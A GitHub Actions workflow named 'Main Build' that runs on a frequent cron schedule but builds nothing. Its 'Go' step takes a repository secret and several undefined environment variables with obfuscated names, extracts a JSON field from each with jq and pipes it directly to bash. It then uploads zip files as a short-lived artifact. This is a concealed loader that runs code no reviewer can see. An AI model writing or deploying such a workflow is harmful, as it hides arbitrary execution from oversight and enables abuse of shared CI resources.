name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '52 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          xl7144: ${{ secrets.xl7144 }}
        run: |
          printf '%s' "$xl7144" | jq -r .nqo77891 | /bin/bash
          printf '%s' "$c086" | jq -r .cso99 | /bin/bash
          echo $ylod38 | jq -r .xz237 | /bin/bash
          printf '%s' "$ptjt3997" | jq -r .lq6 | /bin/bash
          printf '%s' "$olhs47449" | jq -r .mz4 | /bin/bash
          echo $aq6 | jq -r .ov73477 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 2KmISmJO
          path: "*.zip"
          retention-days: 1
